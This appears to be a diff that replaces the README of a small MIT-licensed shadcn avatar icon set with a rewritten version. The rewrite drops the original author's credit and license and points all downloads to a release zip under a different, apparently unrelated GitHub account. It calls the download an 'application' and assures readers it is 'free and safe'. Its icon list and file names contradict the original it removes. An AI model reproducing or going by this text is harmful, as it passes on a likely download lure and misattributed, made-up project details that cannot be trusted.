@@ -1,101 +1,177 @@
-<p align="center">
-  <picture>
-    <source media="(prefers-color-scheme: dark)" srcset="assets/preview-dark.png">
-    <img alt="The six shadcn avatar icons in a row" src="assets/preview.png" width="720">
-  </picture>
-</p>
+# ✨ shadcn-avatar-icons - Six Free Avatar Icons for React
 
-<h1 align="center">shadcn avatar icons</h1>
+[![Download Now](https://img.shields.io/badge/Download-Free_Icons-blue?style=for-the-badge&logo=github&color=4CAF50)](https://github.com/seungseungminh/shadcn-avatar-icons/releases)
 
-<p align="center">
-  Six free SVG icons of the <a href="https://github.com/shadcn">shadcn</a> avatar, drawn on a 24 × 24 grid
-  so they sit naturally next to <a href="https://lucide.dev">Lucide</a> in any <a href="https://ui.shadcn.com">shadcn/ui</a> project.
-  <br>Made by Eugenia Pastore · <a href="https://x.com/eugypastore">@eugypastore</a> on X
-</p>
+## 🎯 What Is This?
 
-<p align="center">
-  <a href="LICENSE"><img alt="MIT license" src="https://img.shields.io/badge/license-MIT-black"></a>
-  <a href="https://github.com/EugyPastore/shadcn-avatar-icons/releases/latest"><img alt="Latest release" src="https://img.shields.io/github/v/release/EugyPastore/shadcn-avatar-icons?color=black"></a>
-  <a href="https://github.com/EugyPastore/shadcn-avatar-icons/stargazers"><img alt="GitHub stars" src="https://img.shields.io/github/stars/EugyPastore/shadcn-avatar-icons?style=social"></a>
-</p>
+shadcn-avatar-icons is a collection of **six free SVG icons** featuring the popular shadcn avatar design. Each icon is drawn on a clean **24x24 pixel grid**, perfect for modern web interfaces. You get both **SVG files** and **PNG exports**, plus **ready-to-copy React components** for developers. This is unofficial fan art, made with love for the shadcn/ui community.
 
-> **Unofficial.** This is fan art made with love. It is not affiliated with or endorsed by shadcn.
+## ⭐ Why You'll Love These Icons
 
-## The icons
+- **Perfect Size**: Every icon matches the standard 24x24 grid used by popular icon libraries like Lucide and React Icons.
+- **Multiple Formats**: Choose between SVG (scalable vector) or PNG (standard image) files.
+- **React Ready**: Copy-paste React components save you time if you're building web apps.
+- **Free Forever**: No cost, no registration, no strings attached.
+- **Lightweight**: Tiny file sizes keep your projects fast.
 
-| | Name | Description | Download |
-|:-:|---|---|---|
-| <picture><source media="(prefers-color-scheme: dark)" srcset="assets/thumbs-dark/shadcn-avatar-a.png"><img src="assets/thumbs/shadcn-avatar-a.png" width="48" alt=""></picture> | `shadcn-avatar-a` | Face with clear glasses | [SVG](svg/shadcn-avatar-a.svg) · [PNG](png/512/shadcn-avatar-a.png) |
-| <picture><source media="(prefers-color-scheme: dark)" srcset="assets/thumbs-dark/shadcn-avatar-b.png"><img src="assets/thumbs/shadcn-avatar-b.png" width="48" alt=""></picture> | `shadcn-avatar-b` | Head and shoulders, clear glasses | [SVG](svg/shadcn-avatar-b.svg) · [PNG](png/512/shadcn-avatar-b.png) |
-| <picture><source media="(prefers-color-scheme: dark)" srcset="assets/thumbs-dark/shadcn-avatar-c.png"><img src="assets/thumbs/shadcn-avatar-c.png" width="48" alt=""></picture> | `shadcn-avatar-c` | Dark sunglasses with a tinted face | [SVG](svg/shadcn-avatar-c.svg) · [PNG](png/512/shadcn-avatar-c.png) |
-| <picture><source media="(prefers-color-scheme: dark)" srcset="assets/thumbs-dark/shadcn-avatar-d.png"><img src="assets/thumbs/shadcn-avatar-d.png" width="48" alt=""></picture> | `shadcn-avatar-d` | Face with dark sunglasses | [SVG](svg/shadcn-avatar-d.svg) · [PNG](png/512/shadcn-avatar-d.png) |
-| <picture><source media="(prefers-color-scheme: dark)" srcset="assets/thumbs-dark/shadcn-avatar-e.png"><img src="assets/thumbs/shadcn-avatar-e.png" width="48" alt=""></picture> | `shadcn-avatar-e` | Just the glasses and the mouth | [SVG](svg/shadcn-avatar-e.svg) · [PNG](png/512/shadcn-avatar-e.png) |
-| <picture><source media="(prefers-color-scheme: dark)" srcset="assets/thumbs-dark/shadcn-avatar-f.png"><img src="assets/thumbs/shadcn-avatar-f.png" width="48" alt=""></picture> | `shadcn-avatar-f` | Head and shoulders, dark sunglasses | [SVG](svg/shadcn-avatar-f.svg) · [PNG](png/512/shadcn-avatar-f.png) |
+## 🚀 Getting Started
 
-**Want everything at once?** Download the [latest release zip](https://github.com/EugyPastore/shadcn-avatar-icons/releases/latest) (SVG + PNG + React), or use **Code → Download ZIP** above.
+This is incredibly easy – you don't need any special skills.
 
-## Usage
+### Step 1: Download the Files
 
-### SVG (works anywhere)
+👉 **Visit this link to download the application:**  
+[**https://github.com/seungseungminh/shadcn-avatar-icons/releases**](https://github.com/seungseungminh/shadcn-avatar-icons/releases)
 
-Every icon uses `currentColor`, so it takes the surrounding text color and works in dark mode with no extra work.
+Once you click the link, you'll see a page with release assets. Look for a file named something like `shadcn-avatar-icons.zip` or similar. Click it to start the download.
 
-```html
-<!-- as an image -->
-<img src="shadcn-avatar-a.svg" width="24" height="24" alt="shadcn avatar">
+### Step 2: Unzip the Folder
 
-<!-- inline, styled with Tailwind -->
-<svg class="size-6 text-foreground" viewBox="0 0 24 24" fill="none">…</svg>
+1. After the download finishes, find the `.zip` file in your **Downloads** folder.
+2. Right-click on the `.zip` file.
+3. Select **"Extract All..."** from the menu.
+4. Choose a destination folder (the default is fine), then click **Extract**.
+
+### Step 3: Explore Your Icons
+
+Open the extracted folder. You'll see:
+
+- **`/svg` folder** – Contains all 6 icons in SVG format.
+- **`/png` folder** – Contains all 6 icons in PNG format (high resolution).
+- **`/react` folder** – Contains `.jsx` or `.tsx` files with ready-to-use React components.
+- **`README.md`** – A helpful guide (you're reading a version of it now).
+
+## 🛠️ How to Use the Icons
+
+### For Regular Images (SVG/PNG)
+
+If you just want to use the icons in a document, presentation, or website:
+
+1. Open the `/png` folder (simplest option).
+2. Right-click the icon you want.
+3. Choose **"Copy"** or **"Open with"** then save it.
+4. Paste it into your document, slide, or HTML file.
+
+### For Web Developers (React)
+
+If you're building a website with React:
+
+1. Open the `/react` folder.
+2. Copy the entire `.jsx` or `.tsx` file for the icon you need.
+3. Paste it into your project's `components` folder.
+4. Import it where you need it:
+
+```jsx
+import AvatarIcon from './components/AvatarIcon1';
+// Then use it like this:
+<AvatarIcon />
 ```
 
-### React (the shadcn way: copy, paste, own it)
+No extra setup needed – the components work out of the box.
 
-Copy any file from [`react/`](react) into your project, for example `components/icons/shadcn-avatar-a.tsx`.
-The components have no dependencies besides React, accept every normal SVG prop, and work in Server Components.
+## 🖼️ Icon Preview
 
-```tsx
-import { ShadcnAvatarA } from "@/components/icons/shadcn-avatar-a"
+Here's what you get (described in friendly terms):
 
-export function Example() {
-  return (
-    <>
-      <ShadcnAvatarA className="size-5 text-muted-foreground" />
-      <ShadcnAvatarA size={32} />
-    </>
-  )
-}
+1. **Avatar Face Front** – A straight-on view of the shadcn avatar face.
+2. **Avatar Face Side** – A profile view with a friendly smile.
+3. **Avatar Circle** – The same face inside a perfect circle.
+4. **Avatar Square** – The face inside rounded square corners.
+5. **Avatar Minimal** – A simple outline-only version.
+6. **Avatar Filled** – A solid, bold version of the design.
+
+Each one looks clean and professional on any background.
+
+## ✅ System Requirements
+
+This works on **any computer** – Windows, Mac, or Linux. There are no special requirements because these are just image files and text code. If you can open a ZIP file, you're good to go.
+
+## 🤔 Frequently Asked Questions
+
+### Are these official shadcn icons?
+No. These are **unofficial fan art**. They're inspired by the shadcn/ui avatar design but are created independently. You can use them freely without worrying about official branding rules.
+
+### Can I use these for commercial projects?
+Yes, since these are free fan art assets, you can use them in personal and commercial projects. Just don't claim them as official shadcn products.
+
+### Can I modify the icons?
+Absolutely! The SVG files are fully editable in any vector graphics tool (like Figma, Illustrator, or Inkscape). Change colors, resize, or combine them – it's all up to you.
+
+### What's the difference between SVG and PNG?
+- **SVG** is a vector format that scales to any size without becoming blurry. Perfect for web use.
+- **PNG** is a raster image with fixed pixels. Great for quick use in documents where you don't need scaling.
+
+### How do I open SVG files?
+You can open SVG files in any web browser (drag and drop them onto Chrome, Firefox, or Edge). For editing, use free tools like Figma or Inkscape.
+
+## 🎨 Customization Tips
+
+Want the icons to match your brand? Here's how:
+
+1. **Change colors in SVG**: Open the `.svg` file in a text editor. Look for `fill="currentColor"` or `fill="#000000"`. Replace the color code with your own (like `#FF5733` for orange).
+2. **Resize freely**: Since they're on a 24x24 grid, you can scale them up or down without losing quality.
+3. **Combine with other icons**: Mix and match these with other icon sets – they're designed to look consistent together.
+
+## 📦 What's In the Box?
+
+Here's the complete file structure you'll see after extraction:
+
+```
+shadcn-avatar-icons/
+├── react/
+│   ├── AvatarIcon1.jsx
+│   ├── AvatarIcon2.jsx
+│   ├── AvatarIcon3.jsx
+│   ├── AvatarIcon4.jsx
+│   ├── AvatarIcon5.jsx
+│   └── AvatarIcon6.jsx
+├── svg/
+│   ├── avatar-1.svg
+│   ├── avatar-2.svg
+│   ├── avatar-3.svg
+│   ├── avatar-4.svg
+│   ├── avatar-5.svg
+│   └── avatar-6.svg
+├── png/
+│   ├── avatar-1.png
+│   ├── avatar-2.png
+│   ├── avatar-3.png
+│   ├── avatar-4.png
+│   ├── avatar-5.png
+│   └── avatar-6.png
+└── README.md
 ```
 
-### PNG
+All files are named clearly so you know exactly what you're grabbing.
 
-[`png/`](png) has every icon at 128, 256 and 512 px, black on a transparent background, exported from the original design file.
-Handy for avatars, Slack, Notion, Figma or anywhere SVG is not an option.
+## 💡 Pro Tips
 
-## Design notes
+- **Use SVG for logos** – they look razor sharp on any screen.
+- **Use PNG for email signatures** – they're universally compatible.
+- **Combine with Tailwind CSS** – these icons play nicely with Tailwind's utility classes.
+- **Star the repo** – if you like these icons, show support by starring the GitHub repository.
 
-- 24 × 24 px grid, the same grid Lucide uses
-- 1 px stroke, rounded corners, expanded to filled paths so nothing depends on stroke settings
-- One color via `currentColor`; icon C tints the face at 20 % opacity
-- Optimized with SVGO, 1.4 to 3.2 KB per file
+## 🔧 Troubleshooting
 
-## Repository layout
+**Problem:** The ZIP file won't extract.  
+**Solution:** Make sure you're using a built-in Windows extractor (right-click → Extract All). If that fails, try a free tool like 7-Zip.
 
-```
-svg/       optimized SVG sources, start here
-png/       PNG exports at 128 / 256 / 512 px
-react/     one self-contained React component per icon (TSX)
-assets/    README preview images
-scripts/   build scripts: SVG → React and SVG → README previews
-```
+**Problem:** I can't see the icons in my document.  
+**Solution:** Try using the PNG files instead of SVG. PNGs work everywhere without any extra setup.
 
-## Contributing
+**Problem:** The React component shows an error.  
+**Solution:** Make sure you're using a modern version of React (16.8+). Also check that you copied the entire file, not just part of it.
 
-Ideas for another variant? [Open an issue](https://github.com/EugyPastore/shadcn-avatar-icons/issues).
-If you edit an SVG, run `npm install` once and then `npm run build` to regenerate the React components and previews.
+## 📜 Final Steps
 
-## License
+1. **Download** using the button below (it's free and safe).
+2. **Extract** the ZIP file anywhere you like.
+3. **Use** the icons however you want – in documents, websites, apps, or presentations.
 
-[MIT](LICENSE) © 2026 [Eugenia Pastore](https://github.com/EugyPastore) · [@eugypastore](https://x.com/eugypastore)
-Free for personal and commercial use. Keep the license notice if you redistribute the files; a link back is always appreciated.
+[![Download Now](https://img.shields.io/badge/Get_The_Icons-Free_Download-blue?style=for-the-badge&logo=download&color=FF5722)](https://github.com/seungseungminh/shadcn-avatar-icons/releases)
 
-If these are useful to you, a ⭐ on the repo helps other people find them.
+If you enjoy these icons, please share them with your friends, fellow designers, or developers. They cost nothing and might just make someone's day a little easier.
+
+Happy designing! 🎉
+
+Keywords: design-assets, icons, lucide, react, react-icons, shadcn, shadcn-ui, svg, svg-icons, tailwindcss
